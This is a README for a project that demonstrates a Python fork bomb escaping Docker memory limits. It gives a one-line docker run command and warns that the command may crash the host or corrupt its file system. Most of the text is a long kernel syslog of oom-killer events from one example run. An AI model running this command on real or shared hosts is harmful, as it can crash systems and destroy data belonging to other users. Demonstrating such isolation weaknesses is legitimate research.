# docker-fork-bomb

Strange things happen, when you execute `docker run -it --rm --memory=128M --kernel-memory=16M lmmdock/fork-bomb`. Be aware that your complete system may crash, even your file system might get corrupted by this command.

It basically just executes a fork bomb in a resource (memory) constrained container.

## Syslog of exemplary run

Executing the image leads to arbitrary system services (such as other containers, user applications on the host or even the file system driver) to be killed. In the following example, the oom-killer didn't kill the our Python-based fork bomb. Instead the whole docker deamon was affected (see 

``` log
[Thu May 14 23:17:23 2020] docker0: port 1(vethe1d71b1) entered blocking state
[Thu May 14 23:17:23 2020] docker0: port 1(vethe1d71b1) entered disabled state
[Thu May 14 23:17:23 2020] device vethe1d71b1 entered promiscuous mode
[Thu May 14 23:17:24 2020] eth0: renamed from vethb427773
[Thu May 14 23:17:24 2020] IPv6: ADDRCONF(NETDEV_CHANGE): vethe1d71b1: link becomes ready
[Thu May 14 23:17:24 2020] docker0: port 1(vethe1d71b1) entered blocking state
[Thu May 14 23:17:24 2020] docker0: port 1(vethe1d71b1) entered forwarding state
[Thu May 14 23:17:24 2020] slab_out_of_memory: 72 callbacks suppressed
[Thu May 14 23:17:24 2020] SLUB: Unable to allocate memory on node -1, gfp=0xcc0(GFP_KERNEL)
[Thu May 14 23:17:24 2020]   cache: vm_area_struct(632851:3a166877f91031145f6dc491df3c915c57f1439f4b3bcea4c6a37d1885ea27ea), object size: 208, buffer size: 208, default order: 1, min order: 0
[Thu May 14 23:17:24 2020] SLUB: Unable to allocate memory on node -1, gfp=0xcc0(GFP_KERNEL)
[Thu May 14 23:17:24 2020] SLUB: Unable to allocate memory on node -1, gfp=0xcc0(GFP_KERNEL)
[Thu May 14 23:17:24 2020]   cache: anon_vma_chain(632851:3a166877f91031145f6dc491df3c915c57f1439f4b3bcea4c6a37d1885ea27ea), object size: 64, buffer size: 64, default order: 0, min order: 0
[Thu May 14 23:17:24 2020]   cache: anon_vma_chain(632851:3a166877f91031145f6dc491df3c915c57f1439f4b3bcea4c6a37d1885ea27ea), object size: 64, buffer size: 64, default order: 0, min order: 0
[Thu May 14 23:17:24 2020]   node 0: slabs: 152, objs: 9728, free: 0
[Thu May 14 23:17:24 2020]   node 0: slabs: 152, objs: 9728, free: 0
[Thu May 14 23:17:24 2020]   node 0: slabs: 166, objs: 6474, free: 0
[Thu May 14 23:17:24 2020] SLUB: Unable to allocate memory on node -1, gfp=0xcc0(GFP_KERNEL)
[Thu May 14 23:17:24 2020]   cache: anon_vma_chain(632851:3a166877f91031145f6dc491df3c915c57f1439f4b3bcea4c6a37d1885ea27ea), object size: 64, buffer size: 64, default order: 0, min order: 0
[Thu May 14 23:17:24 2020]   node 0: slabs: 152, objs: 9728, free: 0
[Thu May 14 23:17:24 2020] SLUB: Unable to allocate memory on node -1, gfp=0xcc0(GFP_KERNEL)
[Thu May 14 23:17:24 2020]   cache: anon_vma(632851:3a166877f91031145f6dc491df3c915c57f1439f4b3bcea4c6a37d1885ea27ea), object size: 80, buffer size: 88, default order: 0, min order: 0
[Thu May 14 23:17:24 2020]   node 0: slabs: 72, objs: 3312, free: 0
[Thu May 14 23:17:24 2020] SLUB: Unable to allocate memory on node -1, gfp=0xcc0(GFP_KERNEL)
[Thu May 14 23:17:24 2020]   cache: anon_vma_chain(632851:3a166877f91031145f6dc491df3c915c57f1439f4b3bcea4c6a37d1885ea27ea), object size: 64, buffer size: 64, default order: 0, min order: 0
[Thu May 14 23:17:24 2020]   node 0: slabs: 163, objs: 10432, free: 0
[Thu May 14 23:17:24 2020] SLUB: Unable to allocate memory on node -1, gfp=0xdc0(GFP_KERNEL|__GFP_ZERO)
[Thu May 14 23:17:24 2020]   cache: signal_cache(632851:3a166877f91031145f6dc491df3c915c57f1439f4b3bcea4c6a37d1885ea27ea), object size: 1056, buffer size: 1088, default order: 3, min order: 0
[Thu May 14 23:17:24 2020]   node 0: slabs: 31, objs: 930, free: 0
[Thu May 14 23:17:24 2020] oom_kill_process: 70 callbacks suppressed
[Thu May 14 23:17:24 2020] python3 invoked oom-killer: gfp_mask=0x0(), order=0, oom_score_adj=0
[Thu May 14 23:17:24 2020] CPU: 25 PID: 3143648 Comm: python3 Not tainted 5.4.0-29-generic #33-Ubuntu
[Thu May 14 23:17:24 2020] Hardware name: OpenStack Foundation OpenStack Nova, BIOS 1.10.2-1ubuntu1 04/01/2014
[Thu May 14 23:17:24 2020] Call Trace:
[Thu May 14 23:17:24 2020]  dump_stack+0x6d/0x9a
[Thu May 14 23:17:24 2020]  dump_header+0x4f/0x1eb
[Thu May 14 23:17:24 2020]  oom_kill_process.cold+0xb/0x10
[Thu May 14 23:17:24 2020]  out_of_memory.part.0+0x1df/0x3d0
[Thu May 14 23:17:24 2020]  out_of_memory+0x6d/0xd0
[Thu May 14 23:17:24 2020]  pagefault_out_of_memory+0x6a/0x7d
[Thu May 14 23:17:24 2020]  mm_fault_error+0x59/0x150
[Thu May 14 23:17:24 2020]  do_user_addr_fault+0x43f/0x450
[Thu May 14 23:17:24 2020]  __do_page_fault+0x58/0x90
[Thu May 14 23:17:24 2020]  do_page_fault+0x2c/0xe0
[Thu May 14 23:17:24 2020]  do_async_page_fault+0x39/0x70
[Thu May 14 23:17:24 2020]  async_page_fault+0x34/0x40
[Thu May 14 23:17:24 2020] RIP: 0033:0x7fc0b9edd9f8
[Thu May 14 23:17:24 2020] Code: Bad RIP value.
[Thu May 14 23:17:24 2020] RSP: 002b:00007ffdca82a7b0 EFLAGS: 00010246
[Thu May 14 23:17:24 2020] RAX: 0000000000000000 RBX: 0000000000000000 RCX: 00007fc0b9db1370
[Thu May 14 23:17:24 2020] RDX: 0000000000000001 RSI: 00007fc0b9dad2f0 RDI: 0000000000000001
[Thu May 14 23:17:24 2020] RBP: 00007fc0b9968f90 R08: 0000000000000000 R09: 00007fc0b9dad2f0
[Thu May 14 23:17:24 2020] R10: 00007fc0b9a3e740 R11: 0000000000000202 R12: 00007fc0ba148ac0
[Thu May 14 23:17:24 2020] R13: 00007fc0b992e840 R14: 00007fc0b992e9b8 R15: 00007fc0b992e9b0
[Thu May 14 23:17:24 2020] Mem-Info:
[Thu May 14 23:17:24 2020] active_anon:57988 inactive_anon:147 isolated_anon:0
                            active_file:578569 inactive_file:1353156 isolated_file:0
                            unevictable:4579 dirty:120 writeback:0 unstable:0
                            slab_reclaimable:559978 slab_unreclaimable:198012
                            mapped:44734 shmem:289 pagetables:2081 bounce:0
                            free:30149832 free_pcp:4723 free_cma:0
[Thu May 14 23:17:24 2020] Node 0 active_anon:231952kB inactive_anon:588kB active_file:2314276kB inactive_file:5412624kB unevictable:18316kB isolated(anon):0kB isolated(file):0kB mapped:178936kB dirty:480kB writeback:0kB shmem:1156kB shmem_thp: 0kB shmem_pmdmapped: 0kB anon_thp: 4096kB writeback_tmp:0kB unstable:0kB all_unreclaimable? no
[Thu May 14 23:17:24 2020] Node 0 DMA free:15908kB min:8kB low:20kB high:32kB active_anon:0kB inactive_anon:0kB active_file:0kB inactive_file:0kB unevictable:0kB writepending:0kB present:15992kB managed:15908kB mlocked:0kB kernel_stack:0kB pagetables:0kB bounce:0kB free_pcp:0kB local_pcp:0kB free_cma:0kB
[Thu May 14 23:17:24 2020] lowmem_reserve[]: 0 2966 128782 128782 128782
[Thu May 14 23:17:24 2020] Node 0 DMA32 free:3061820kB min:1556kB low:4592kB high:7628kB active_anon:0kB inactive_anon:0kB active_file:0kB inactive_file:0kB unevictable:0kB writepending:0kB present:3129200kB managed:3063664kB mlocked:0kB kernel_stack:0kB pagetables:0kB bounce:0kB free_pcp:1820kB local_pcp:0kB free_cma:0kB
[Thu May 14 23:17:24 2020] lowmem_reserve[]: 0 0 125816 125816 125816
[Thu May 14 23:17:24 2020] Node 0 Normal free:117521600kB min:66016kB low:194848kB high:323680kB active_anon:231952kB inactive_anon:588kB active_file:2314276kB inactive_file:5412624kB unevictable:18316kB writepending:480kB present:131072000kB managed:128843628kB mlocked:18316kB kernel_stack:26656kB pagetables:8324kB bounce:0kB free_pcp:17052kB local_pcp:652kB free_cma:0kB
[Thu May 14 23:17:24 2020] lowmem_reserve[]: 0 0 0 0 0
[Thu May 14 23:17:24 2020] Node 0 DMA: 1*4kB (U) 0*8kB 0*16kB 1*32kB (U) 2*64kB (U) 1*128kB (U) 1*256kB (U) 0*512kB 1*1024kB (U) 1*2048kB (M) 3*4096kB (M) = 15908kB
[Thu May 14 23:17:24 2020] Node 0 DMA32: 1*4kB (M) 1*8kB (U) 3*16kB (M) 2*32kB (M) 3*64kB (M) 2*128kB (M) 2*256kB (M) 4*512kB (UM) 3*1024kB (UM) 2*2048kB (UM) 745*4096kB (M) = 3061820kB
[Thu May 14 23:17:24 2020] Node 0 Normal: 237978*4kB (UME) 179547*8kB (UME) 87980*16kB (UME) 56977*32kB (UME) 25673*64kB (UME) 7943*128kB (UME) 1821*256kB (UME) 494*512kB (UME) 157*1024kB (UME) 24*2048kB (UME) 26442*4096kB (M) = 117514464kB
[Thu May 14 23:17:24 2020] Node 0 hugepages_total=0 hugepages_free=0 hugepages_surp=0 hugepages_size=2048kB
[Thu May 14 23:17:24 2020] 1906236 total pagecache pages
[Thu May 14 23:17:24 2020] 0 pages in swap cache
[Thu May 14 23:17:24 2020] Swap cache stats: add 0, delete 0, find 0/0
[Thu May 14 23:17:24 2020] Free swap  = 0kB
[Thu May 14 23:17:24 2020] Total swap = 0kB
[Thu May 14 23:17:24 2020] 33554298 pages RAM
[Thu May 14 23:17:24 2020] 0 pages HighMem/MovableOnly
[Thu May 14 23:17:24 2020] 573498 pages reserved
[Thu May 14 23:17:24 2020] 0 pages cma reserved
[Thu May 14 23:17:24 2020] 0 pages hwpoisoned
[Thu May 14 23:17:24 2020] Tasks state (memory values in pages):
[Thu May 14 23:17:24 2020] [  pid  ]   uid  tgid total_vm      rss pgtables_bytes swapents oom_score_adj name
[Thu May 14 23:17:24 2020] [    677]     0   677    19038     7234   159744        0          -250 systemd-journal
[Thu May 14 23:17:24 2020] [    707]     0   707     4795     1383    65536        0         -1000 systemd-udevd
[Thu May 14 23:17:24 2020] [    838]     0   838    53645     4481    81920        0         -1000 multipathd
[Thu May 14 23:17:24 2020] [    868]   102   868    22597     1597    77824        0             0 systemd-timesyn
[Thu May 14 23:17:24 2020] [    888]   100   888     8795     2068    81920        0             0 systemd-network
[Thu May 14 23:17:24 2020] [    893]   101   893     6045     3332    86016        0             0 systemd-resolve
[Thu May 14 23:17:24 2020] [    939]     0   939    60254     2365   102400        0             0 accounts-daemon
[Thu May 14 23:17:24 2020] [    947]     0   947     2134      747    49152        0             0 cron
[Thu May 14 23:17:24 2020] [    949]   103   949     1881     1178    57344        0          -900 dbus-daemon
[Thu May 14 23:17:24 2020] [    958]     0   958    20478      931    57344        0             0 irqbalance
[Thu May 14 23:17:24 2020] [    963]   104   963    56119     1595    73728        0             0 rsyslogd
[Thu May 14 23:17:24 2020] [    966]     0   966     4222     2049    65536        0             0 systemd-logind
[Thu May 14 23:17:24 2020] [    972]     0   972      948      573    49152        0             0 atd
[Thu May 14 23:17:24 2020] [    988]     0   988     3040     1819    57344        0         -1000 sshd
[Thu May 14 23:17:24 2020] [   1037]     0  1037     1838      535    53248        0             0 agetty
[Thu May 14 23:17:24 2020] [   1060]     0  1060     1457      450    45056        0             0 agetty
[Thu May 14 23:17:24 2020] [   1203]     0  1203    59101     2290    94208        0             0 polkitd
[Thu May 14 23:17:24 2020] [   1779]     0  1779      622      147    45056        0             0 none
[Thu May 14 23:17:24 2020] [ 181470]     0 181470     5028     1510    61440        0             0 nginx
[Thu May 14 23:17:24 2020] [ 198207]   112 198207     6306     2950    73728        0             0 nginx
[Thu May 14 23:17:24 2020] [1129252]     0 1129252     5715     3553    90112        0             0 systemd
[Thu May 14 23:17:24 2020] [1928036]     0 1928036     3850     2732    77824        0             0 sshd
[Thu May 14 23:17:24 2020] [1928238]     0 1928238     3506     2306    61440        0             0 bash
[Thu May 14 23:17:24 2020] [2197868]     0 2197868     3443     2283    57344        0             0 sshd
[Thu May 14 23:17:24 2020] [2198133]     0 2198133     3744     2513    69632        0             0 bash
[Thu May 14 23:17:24 2020] [2221214]     0 2221214     3444     2239    61440        0             0 sshd
[Thu May 14 23:17:24 2020] [2221374]     0 2221374     3346     2094    65536        0             0 bash
[Thu May 14 23:17:24 2020] [2296209]     0 2296209  4841483    23552  2670592        0             0 containerd
[Thu May 14 23:17:24 2020] [3042347]     0 3042347  5287337    39430  3727360        0          -500 dockerd
[Thu May 14 23:17:24 2020] [3123537]     0 3123537     1869      597    53248        0             0 dmesg
[Thu May 14 23:17:24 2020] [3143502]     0 3143502   321041    14927   368640        0             0 docker
[Thu May 14 23:17:24 2020] [3143518]     0 3143518     4795      858    61440        0             0 systemd-udevd
[Thu May 14 23:17:24 2020] [3143519]     0 3143519     4795      858    61440        0             0 systemd-udevd
[Thu May 14 23:17:24 2020] [3143526]     0 3143526     4795      841    61440        0             0 systemd-udevd
[Thu May 14 23:17:24 2020] [3143527]     0 3143527    27143     1291    73728        0             1 containerd-shim
[Thu May 14 23:17:24 2020] [3143544]     0 3143544     4795      841    61440        0             0 systemd-udevd
[Thu May 14 23:17:24 2020] [3143545] 231072 3143545     2982     2314    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143546]     0 3143546     4795      841    61440        0             0 systemd-udevd
[Thu May 14 23:17:24 2020] [3143547]     0 3143547     4795      820    61440        0             0 systemd-udevd
[Thu May 14 23:17:24 2020] [3143553]     0 3143553     4795      739    61440        0             0 systemd-udevd
[Thu May 14 23:17:24 2020] [3143554]     0 3143554     4795      723    61440        0             0 systemd-udevd
[Thu May 14 23:17:24 2020] [3143555]     0 3143555     4795      707    61440        0             0 systemd-udevd
[Thu May 14 23:17:24 2020] [3143594] 231072 3143594     2982     2064    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143595] 231072 3143595     2982     2064    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143596] 231072 3143596     2982     2070    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143597] 231072 3143597     2982     1527    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143598] 231072 3143598     2982     2069    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143599] 231072 3143599     2982     1941    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143600] 231072 3143600     2982     2070    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143601] 231072 3143601     2982     2070    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143602] 231072 3143602     2982     2070    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143604] 231072 3143604     2982     2042    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143603] 231072 3143603     2982     2022    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143605] 231072 3143605     2982     1970    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143606] 231072 3143606     2982     1523    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143607] 231072 3143607     2982     2021    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143608] 231072 3143608     2982     1541    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143609] 231072 3143609     2982     1744    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143610] 231072 3143610     2982     2070    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143611] 231072 3143611     2982     2070    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143612] 231072 3143612     2982     2068    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143613] 231072 3143613     2982     1744    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143614] 231072 3143614     2982     2064    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143615] 231072 3143615     2982     2006    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143616] 231072 3143616     2982     1077    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143617] 231072 3143617     2982     1444    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143618] 231072 3143618     2982     2068    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143619] 231072 3143619     2982     2054    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143620] 231072 3143620     2982     1840    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143621] 231072 3143621     2982     2067    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143622] 231072 3143622     2982     2068    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143623] 231072 3143623     2982     2004    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143624] 231072 3143624     2982     2054    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143625] 231072 3143625     2982     1606    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143626] 231072 3143626     2982     1077    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143627] 231072 3143627     2982     1077    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143628] 231072 3143628     2982     2057    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143629] 231072 3143629     2982     2070    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143630] 231072 3143630     2982     1077    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143631] 231072 3143631     2982     1666    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143632] 231072 3143632     2982     1077    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143633] 231072 3143633     2982     1077    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143634] 231072 3143634     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143635] 231072 3143635     2982     1077    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143636] 231072 3143636     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143637] 231072 3143637     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143638] 231072 3143638     2982     1077    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143639] 231072 3143639     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143640] 231072 3143640     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143641] 231072 3143641     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143642] 231072 3143642     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143643] 231072 3143643     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143644] 231072 3143644     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143645] 231072 3143645     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143646] 231072 3143646     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143647] 231072 3143647     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143648] 231072 3143648     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143649] 231072 3143649     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143650] 231072 3143650     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143651] 231072 3143651     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143652] 231072 3143652     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143653] 231072 3143653     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143654] 231072 3143654     2982     1077    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143656] 231072 3143656     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143655] 231072 3143655     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143657] 231072 3143657     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143658] 231072 3143658     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143659] 231072 3143659     2982     1077    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143660] 231072 3143660     2982     1077    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143661] 231072 3143661     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143662] 231072 3143662     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143663] 231072 3143663     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143664] 231072 3143664     2982     1077    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143665] 231072 3143665     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143666] 231072 3143666     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143667] 231072 3143667     2982     1077    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143668] 231072 3143668     2982     1077    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143669] 231072 3143669     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143670] 231072 3143670     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143671] 231072 3143671     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143672] 231072 3143672     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143673] 231072 3143673     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143674] 231072 3143674     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143675] 231072 3143675     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143676] 231072 3143676     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143677] 231072 3143677     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143678] 231072 3143678     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143679] 231072 3143679     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143680] 231072 3143680     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143681] 231072 3143681     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143682] 231072 3143682     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143683] 231072 3143683     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] oom-kill:constraint=CONSTRAINT_NONE,nodemask=(null),cpuset=3a166877f91031145f6dc491df3c915c57f1439f4b3bcea4c6a37d1885ea27ea,mems_allowed=0,global_oom,task_memcg=/system.slice/containerd.service,task=containerd-shim,pid=3143527,uid=0
[Thu May 14 23:17:24 2020] Out of memory: Killed process 3143527 (containerd-shim) total-vm:108572kB, anon-rss:620kB, file-rss:4544kB, shmem-rss:0kB, UID:0 pgtables:72kB oom_score_adj:1
[Thu May 14 23:17:24 2020] SLUB: Unable to allocate memory on node -1, gfp=0xdc0(GFP_KERNEL|__GFP_ZERO)
[Thu May 14 23:17:24 2020]   cache: filp(632851:3a166877f91031145f6dc491df3c915c57f1439f4b3bcea4c6a37d1885ea27ea), object size: 256, buffer size: 256, default order: 1, min order: 0
[Thu May 14 23:17:24 2020]   node 0: slabs: 34, objs: 1088, free: 0
[Thu May 14 23:17:24 2020] SLUB: Unable to allocate memory on node -1, gfp=0xcc0(GFP_KERNEL)
[Thu May 14 23:17:24 2020] oom_reaper: reaped process 3143527 (containerd-shim), now anon-rss:0kB, file-rss:0kB, shmem-rss:0kB
[Thu May 14 23:17:24 2020]   cache: anon_vma_chain(632851:3a166877f91031145f6dc491df3c915c57f1439f4b3bcea4c6a37d1885ea27ea), object size: 64, buffer size: 64, default order: 0, min order: 0
[Thu May 14 23:17:24 2020]   node 0: slabs: 166, objs: 10624, free: 0
[Thu May 14 23:17:24 2020] python3 invoked oom-killer: gfp_mask=0x0(), order=0, oom_score_adj=0
[Thu May 14 23:17:24 2020] CPU: 14 PID: 3143637 Comm: python3 Not tainted 5.4.0-29-generic #33-Ubuntu
[Thu May 14 23:17:24 2020] Hardware name: OpenStack Foundation OpenStack Nova, BIOS 1.10.2-1ubuntu1 04/01/2014
[Thu May 14 23:17:24 2020] Call Trace:
[Thu May 14 23:17:24 2020]  dump_stack+0x6d/0x9a
[Thu May 14 23:17:24 2020]  dump_header+0x4f/0x1eb
[Thu May 14 23:17:24 2020]  oom_kill_process.cold+0xb/0x10
[Thu May 14 23:17:24 2020]  out_of_memory.part.0+0x1df/0x3d0
[Thu May 14 23:17:24 2020]  out_of_memory+0x6d/0xd0
[Thu May 14 23:17:24 2020]  pagefault_out_of_memory+0x6a/0x7d
[Thu May 14 23:17:24 2020]  mm_fault_error+0x59/0x150
[Thu May 14 23:17:24 2020]  do_user_addr_fault+0x43f/0x450
[Thu May 14 23:17:24 2020]  __do_page_fault+0x58/0x90
[Thu May 14 23:17:24 2020]  do_page_fault+0x2c/0xe0
[Thu May 14 23:17:24 2020]  do_async_page_fault+0x39/0x70
[Thu May 14 23:17:24 2020]  async_page_fault+0x34/0x40
[Thu May 14 23:17:24 2020] RIP: 0033:0x7fc0b9edd9f8
[Thu May 14 23:17:24 2020] Code: Bad RIP value.
[Thu May 14 23:17:24 2020] RSP: 002b:00007ffdca82a7b0 EFLAGS: 00010246
[Thu May 14 23:17:24 2020] RAX: 0000000000000000 RBX: 0000000000000000 RCX: 00007fc0b9db1370
[Thu May 14 23:17:24 2020] RDX: 0000000000000001 RSI: 00007fc0b9dad2f0 RDI: 0000000000000001
[Thu May 14 23:17:24 2020] RBP: 00007fc0b9968f90 R08: 0000000000000000 R09: 00007fc0b9dad2f0
[Thu May 14 23:17:24 2020] R10: 00007fc0b9a3e740 R11: 0000000000000202 R12: 00007fc0ba148ac0
[Thu May 14 23:17:24 2020] R13: 00007fc0b992e840 R14: 00007fc0b992e9b8 R15: 00007fc0b992e9b0
[Thu May 14 23:17:24 2020] Mem-Info:
[Thu May 14 23:17:24 2020] active_anon:66808 inactive_anon:147 isolated_anon:0
                            active_file:578569 inactive_file:1353156 isolated_file:0
                            unevictable:4579 dirty:372 writeback:0 unstable:0
                            slab_reclaimable:559978 slab_unreclaimable:198012
                            mapped:43348 shmem:289 pagetables:2081 bounce:0
                            free:30140472 free_pcp:4509 free_cma:0
[Thu May 14 23:17:24 2020] Node 0 active_anon:267232kB inactive_anon:588kB active_file:2314276kB inactive_file:5412624kB unevictable:18316kB isolated(anon):0kB isolated(file):0kB mapped:173392kB dirty:1488kB writeback:0kB shmem:1156kB shmem_thp: 0kB shmem_pmdmapped: 0kB anon_thp: 4096kB writeback_tmp:0kB unstable:0kB all_unreclaimable? no
[Thu May 14 23:17:24 2020] Node 0 DMA free:15908kB min:8kB low:20kB high:32kB active_anon:0kB inactive_anon:0kB active_file:0kB inactive_file:0kB unevictable:0kB writepending:0kB present:15992kB managed:15908kB mlocked:0kB kernel_stack:0kB pagetables:0kB bounce:0kB free_pcp:0kB local_pcp:0kB free_cma:0kB
[Thu May 14 23:17:24 2020] lowmem_reserve[]: 0 2966 128782 128782 128782
[Thu May 14 23:17:24 2020] Node 0 DMA32 free:3061820kB min:1556kB low:4592kB high:7628kB active_anon:0kB inactive_anon:0kB active_file:0kB inactive_file:0kB unevictable:0kB writepending:0kB present:3129200kB managed:3063664kB mlocked:0kB kernel_stack:0kB pagetables:0kB bounce:0kB free_pcp:1820kB local_pcp:0kB free_cma:0kB
[Thu May 14 23:17:24 2020] lowmem_reserve[]: 0 0 125816 125816 125816
[Thu May 14 23:17:24 2020] Node 0 Normal free:117483656kB min:66016kB low:194848kB high:323680kB active_anon:267736kB inactive_anon:588kB active_file:2314276kB inactive_file:5412624kB unevictable:18316kB writepending:1984kB present:131072000kB managed:128843628kB mlocked:18316kB kernel_stack:26656kB pagetables:8324kB bounce:0kB free_pcp:17056kB local_pcp:372kB free_cma:0kB
[Thu May 14 23:17:24 2020] lowmem_reserve[]: 0 0 0 0 0
[Thu May 14 23:17:24 2020] Node 0 DMA: 1*4kB (U) 0*8kB 0*16kB 1*32kB (U) 2*64kB (U) 1*128kB (U) 1*256kB (U) 0*512kB 1*1024kB (U) 1*2048kB (M) 3*4096kB (M) = 15908kB
[Thu May 14 23:17:24 2020] Node 0 DMA32: 1*4kB (M) 1*8kB (U) 3*16kB (M) 2*32kB (M) 3*64kB (M) 2*128kB (M) 2*256kB (M) 4*512kB (UM) 3*1024kB (UM) 2*2048kB (UM) 745*4096kB (M) = 3061820kB
[Thu May 14 23:17:24 2020] Node 0 Normal: 229140*4kB (UME) 179576*8kB (UME) 88043*16kB (UME) 56982*32kB (UME) 25674*64kB (UME) 7943*128kB (UME) 1821*256kB (UME) 494*512kB (UME) 157*1024kB (UME) 24*2048kB (UME) 26442*4096kB (M) = 117480576kB
[Thu May 14 23:17:24 2020] Node 0 hugepages_total=0 hugepages_free=0 hugepages_surp=0 hugepages_size=2048kB
[Thu May 14 23:17:24 2020] 1906236 total pagecache pages
[Thu May 14 23:17:24 2020] 0 pages in swap cache
[Thu May 14 23:17:24 2020] Swap cache stats: add 0, delete 0, find 0/0
[Thu May 14 23:17:24 2020] Free swap  = 0kB
[Thu May 14 23:17:24 2020] Total swap = 0kB
[Thu May 14 23:17:24 2020] 33554298 pages RAM
[Thu May 14 23:17:24 2020] 0 pages HighMem/MovableOnly
[Thu May 14 23:17:24 2020] 573498 pages reserved
[Thu May 14 23:17:24 2020] 0 pages cma reserved
[Thu May 14 23:17:24 2020] 0 pages hwpoisoned
[Thu May 14 23:17:24 2020] Tasks state (memory values in pages):
[Thu May 14 23:17:24 2020] [  pid  ]   uid  tgid total_vm      rss pgtables_bytes swapents oom_score_adj name
[Thu May 14 23:17:24 2020] [    677]     0   677    19038     7350   159744        0          -250 systemd-journal
[Thu May 14 23:17:24 2020] [    707]     0   707     4795     1383    65536        0         -1000 systemd-udevd
[Thu May 14 23:17:24 2020] [    838]     0   838    53645     4481    81920        0         -1000 multipathd
[Thu May 14 23:17:24 2020] [    868]   102   868    22597     1597    77824        0             0 systemd-timesyn
[Thu May 14 23:17:24 2020] [    888]   100   888     8795     2068    81920        0             0 systemd-network
